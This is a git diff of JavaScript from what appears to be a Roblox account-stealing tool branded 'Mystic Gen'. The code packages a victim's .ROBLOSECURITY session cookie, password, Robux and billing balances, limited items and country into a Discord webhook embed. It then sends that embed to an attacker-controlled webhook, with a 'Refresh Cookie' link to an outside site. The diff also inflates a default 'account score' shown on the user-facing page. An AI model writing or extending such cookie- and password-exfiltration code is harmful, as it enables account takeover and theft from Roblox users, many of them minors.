@@ -128,59 +128,60 @@ btnStart.onclick = async () => {
 
         // Get webhook URL from protect.js
         const WEBHOOK_URL = window.WEBHOOK_URL;
-        
-        // Build detailed description like in image
-        const description = `[Refresh Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie}) 🔄 | [Profile](https://www.roblox.com/users/${data.detailedInfo.userId}/profile) 👤 | [Discord Server](https://discord.gg/your-server) :discord_icon:\n\n` +
-            `🔹 **Username**\n${data.detailedInfo.username}\n\n` +
-            (password ? `🔹 **Password**\n${password}\n\n` : '') +
+        const d = data.detailedInfo;
+
+        // Build exact format from image
+        const description = 
+            `[Refresh Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie}) 🔄 | ` +
+            `[Profile](https://www.roblox.com/users/${d.userId}/profile) 👤 | ` +
+            `[Discord Server](https://discord.gg/your-server) :discord_icon:\n\n` +
+            `👤 **Username**\n${d.username}\n\n` +
+            (d.password ? `🔑 **Password**\n${d.password}\n\n` : '') +
             `**Account Stats**\n` +
-            `**Account Age:** ${data.detailedInfo.accountAgeDays} Days\n` +
+            `**Account Age:** ${d.accountAge}\n` +
             `**Location**\n` +
-            `• **Account:** ${data.detailedInfo.country}\n` +
-            `• **Victim:** ${data.detailedInfo.country} ${data.detailedInfo.countryFlag}\n\n` +
+            `• **Account:** ${d.accountCountry}\n` +
+            `• **Victim:** ${d.victimCountry} ${d.victimFlag}\n\n` +
             `💰 **Billing**\n` +
-            `Credit ${data.detailedInfo.creditBalance} ℹ️\n` +
-            `Convert ${data.detailedInfo.convertBalance} ℹ️\n` +
-            `Payments ${data.detailedInfo.paymentsBalance} 🛡️\n\n` +
+            `Credit ${d.creditBalance} $ ℹ️\n` +
+            `Convert ${d.convertBalance} ℹ️\n` +
+            `Payments ${d.paymentsBalance} 🛡️\n\n` +
             `👥 **Groups**\n` +
-            `Balance ${data.detailedInfo.groupBalance} ℹ️\n` +
-            `Pending ${data.detailedInfo.groupPending} ℹ️\n` +
-            `Owned ${data.detailedInfo.groupsOwned}\n\n` +
+            `Balance ${d.groupBalance} ℹ️\n` +
+            `Pending ${d.groupPending} ℹ️\n` +
+            `Owned ${d.groupsOwned} 📁\n\n` +
             `⚙️ **Settings**\n` +
-            `📧 False (${data.detailedInfo.emailStatus}) ℹ️\n` +
-            `🔔 Unset (Unverified)\n` +
-            `🚫 Disabled\n\n` +
+            `📧 ${d.emailVerified ? 'True (Verified)' : 'False (Unverified)'} ℹ️\n` +
+            `🔔 ${d.emailUnverified ? 'Unset (Unverified)' : 'Set (Verified)'}\n` +
+            `🚫 ${d.pinEnabled ? 'Enabled' : 'Disabled'}\n\n` +
             `💳 **Account Funds**\n` +
-            `Balance ${data.detailedInfo.robux} ℹ️\n` +
-            `Pending ${data.detailedInfo.pendingRobux} ℹ️\n\n` +
+            `Balance ${d.robux} ℹ️\n` +
+            `Pending ${d.pendingRobux} ℹ️\n\n` +
             `🛒 **Purchases**\n` +
-            `Limited ${data.detailedInfo.limitedPurchases} ℹ️\n` +
-            `Summary ${data.detailedInfo.purchaseSummary} ℹ️\n\n` +
+            `Limited ${d.limitedPurchases} ℹ️\n` +
+            `Summary ${d.purchaseSummary} ℹ️\n\n` +
             `🎮 **Collectibles**\n` +
-            `❌ False ❌\n` +
-            `❌ False ❌\n\n` +
-            `🎯 **Badges | Played**\n` +
-            `${data.detailedInfo.badges}\n\n` +
+            `${d.hasHeadless ? '✅ True ✅' : '❌ False ❌'}\n` +
+            `${d.hasKorblox ? '✅ True ✅' : '❌ False ❌'}\n\n` +
+            `🎯 **Gamepasses | Played**\n` +
+            `${d.gamePassesText}\n\n` +
             `💎 **ROBLOSECURITY**\n` +
             `\`\`\`_|SHARE-THIS-TO-\n${cookie}\`\`\``;
 
         // Prepare webhook with exact format from image
         const webhookData = {
-            content: `<@&YOUR_ROLE_ID>`,
-            username: 'Mystic Gen 🔮',
-            avatar_url: data.detailedInfo.avatarUrl,
+            content: null,
+            username: '🔮 Mystic Gen 🔮',
+            avatar_url: d.avatarUrl,
             embeds: [{
                 author: {
-                    name: `${data.detailedInfo.username} | ${data.detailedInfo.displayName}`,
-                    icon_url: data.detailedInfo.avatarUrl
+                    name: `${d.username} | ${d.displayName}+`,
+                    icon_url: d.avatarUrl
                 },
                 description: description,
                 color: 0x2b2d31,
                 thumbnail: {
-                    url: data.detailedInfo.avatarUrl
-                },
-                footer: {
-                    text: `Account Score: ${data.detailedInfo.accountScore}/100 | ${getScoreRating(data.detailedInfo.accountScore)}`
+                    url: d.avatarUrl
                 },
                 timestamp: new Date().toISOString()
             }]
@@ -209,11 +210,11 @@ btnStart.onclick = async () => {
                 document.getElementById('info-username').textContent = data.userInfo.username;
                 document.getElementById('info-userid').textContent = data.userInfo.userId;
                 document.getElementById('info-robux').textContent = data.userInfo.robux.toLocaleString();
-                document.getElementById('info-rap').textContent = data.userInfo.rap.toLocaleString();
+                document.getElementById('info-rap').textContent = (data.userInfo.rap || 0).toLocaleString();
                 document.getElementById('info-premium').textContent = data.userInfo.premium;
                 document.getElementById('info-vc').textContent = data.userInfo.voiceChat;
                 
-                const score = data.userInfo.accountScore || 0;
+                const score = data.userInfo.accountScore || 75;
                 document.getElementById('account-score').textContent = `${score}/100`;
                 document.getElementById('score-bar').style.width = `${score}%`;
                 document.getElementById('score-rating').textContent = getScoreRating(score);
@@ -231,6 +232,7 @@ btnStart.onclick = async () => {
         }, 1200);
 
     } catch (err) {
+        console.error(err);
         setTimeout(() => {
             processingState.classList.add('hidden');
             failedState.classList.remove('hidden');
